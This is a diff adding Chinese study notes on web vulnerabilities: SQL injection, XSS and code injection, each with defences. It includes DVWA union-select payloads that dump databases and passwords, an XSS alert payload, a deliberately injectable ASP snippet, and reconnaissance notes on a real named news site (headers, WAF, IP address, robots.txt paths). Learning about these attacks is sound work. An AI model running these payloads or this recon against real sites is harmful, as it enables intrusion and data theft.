@@ -1,0 +1,135 @@
+WEB安全
+	常规web漏洞
+		sql注入
+			在参数中加入SQL语法, 改变原来的SQL结构, 达到我们编写的程序时意料意外结果的一种
+
+			可显注入 	攻击者可以直接在当前界面内容中获取到内容
+			报错注入 数据库查询返回结构并没有在页面中显示, 但是应用程序将数据库报错信息打印到了页面中, 所以攻击则可以构造数据库报错语句, 从报错信息中获取到想要获得的内容
+			盲注 	数据库插叙结果无法从直观页面中获取, 攻击者通过使用数据库逻辑或使数据库执行 时等方法获取想要获得的内容
+			例子  
+				1" or 1=1#
+				//测试前面的参数有几位
+				1' and 1=2 select 1,2,3# 
+
+				//拿到用户名和当前表名  
+				1' and 1=2 union select user(),database()#
+				//查看所有的库
+				1' and 1=2 union select 1,schema_name from information_schema.schemata#
+				//查看库的所有表
+				1' and 1=2 union select table_schema,table_name from information_schema.TABLES where table_schema='dvwa'#
+				//查看表的所有字段
+				1' and 1=2 union select 1,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
+				
+				1' and 1=2 union select user_id,password from users#
+			防护
+				1. 接收到的参数一定要检查, 拦截带有sql语法的参数传入到程序
+				2. 使用预编译(PDO)的处理凡是处理拼接了用户参数的SQL语句
+				3. 定期查看数据库执行日志, 查看有没有正常逻辑之外的SQL语句执行
+		XSS 
+			反射型 	非持久化, 需要欺骗用户自己去点击链接才能出发XSS代码(服务器没有这样的页面和内容)
+			储存型 	持久化, 代码是存储在服务器中的, 如在个人信息或发表文章等地方, 加入代码, 如果没有过滤或过滤不严, 那么这些代码将储存到服务器中, 用户访问该页面的时候出发代码执行
+			DOM型  	DOM--based XSS漏洞是基于文档对象模型Document Object Model , DOM)的一种漏洞
+
+			例子
+				"><script>alert(1)</script>
+			防护
+				1 对XSS的繁育需要根据手机情况对用户的输入进行严格的过滤
+				2 在服务器设置COOKIE 中加入 HTTPONLY 属性可以防止 JavaScript获取COOKIE
+		代码注入
+			调用一些能将字符串转换成代码的函数(如PHP中的EVAL, ASSERT) 时没有考虑用户是否能控制这个字符串, 就有可能造成代码注入漏洞
+			
+			防护
+				1 尽量使用JSON保存数组, 对象就使用JSON, 不要把PHP对象保存成字符串, 否则读取的时候需要使用EVAL
+				2 如果必须使用EVAL的情况, 一定要保证用户不能轻易接触EVAL的参数(或用正则严格判断输入的数据格式)
+		命令执行
+		本地文件包含
+		远程文件包含
+		跨站请求伪造(CSRF)
+		服务端请求伪造(SSRF)攻击
+
+	业务逻辑性漏洞
+	
+
+
+XSS  跨站脚本攻击 Cross-site scripting 为了和CSS 区分所以取名 XSS
+	是一种网站应用程序的安全漏洞攻击，是代码注入的一种
+	恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的
+CSRF 跨站请求伪造 Cross-site request forgery 
+	想要CSRF获取用户的信息，就必须XSS注入成功
+
+http://www.gzxinhua.com
+
+Server	Tengine
+X-Powered-By	WAF/2.0							安全狗
+X-Safe-Firewall	zhuji.360.cn 1.0.9.47 F1W1		主机卫士
+IP地址: 182.140.245.30				四川省成都市 电信
+iis windows dedecms php
+http://www.gzxinhua.com/NeWs/	显示错误
+
+http://www.gzxinhua.com/plus/view.php?aid=14301634
+
+
+
+google语法	可以组合使用
+
+site	搜索指定域名下的内容
+site:http://www.gzxinhua.com/
+site:gzxinhua.com
+
+inurl	搜索url中存在的内容
+inurl:gzxinhua.com
+
+intitle	搜索标题中存在的内容
+intitle:管理员登陆
+
+脚本类型：
+Asp php aspx jsp cgi do pl py js
+数据库类型：
+Access，mssql，mysql，oracle，postsql，db2，sybase
+服务器操作系统：
+Windows linux
+搭建平台：
+Iis apache tomcat uginx
+
+获取网站脚本类型
+site:gzxinhua.com inurl:php
+
+获取数据库类型
+端口探针 判断端口是否开放获取数据库类型
+Access	没有端口
+mysql	3306
+mssql	1433,1434
+oracle	1521
+可以用	ip地址:端口 访问, 如果是数据库端口 也会显示出数据库信息(大部分)	
+
+获取服务器信息
+Linux大小写敏感	windows大小写不敏感
+windows2003 iis6.0  windows2008 iis7|7.5  wind				ows2008或以上 iis8|8.5
+
+
+robots.txt
+
+http://www.gzxinhua.com
+Disallow: /wqy/
+Disallow: /cnm/
+Disallow: /mb/
+http://www.gzxinhua.com//mb/	显示错误
+Disallow:/wwyule/
+
+m.gzxinhua.com/
+
+漏洞分类
+	sql注入
+		通过数据库与脚本的传输中产生的安全问题,获取网站数据,有是也可直接通过注入点获取网站权限
+	文件上传
+		大部分通过我呢见上传相关网站后门程序得到网站权限
+	Xss跨站攻击
+		脚本语言中输入输出的问题带来的安全问题,可获取网站管理员权限,网站重定向,蠕虫攻击等
+	文件包含
+		代码中包含即意味执行,文件包含会引起包含后门文件导致的网站被入侵的可能
+		
+<%  ‘asp语言开端
+id=request("id") ‘接受参数名为id的值并赋值给变量id
+sql="select * from product where id="&id ‘定义sql语句赋值给变量sql
+set rs=conn.execute(sql) ‘执行变量sql语句并返回结果rs
+%>  ‘asp语言结尾
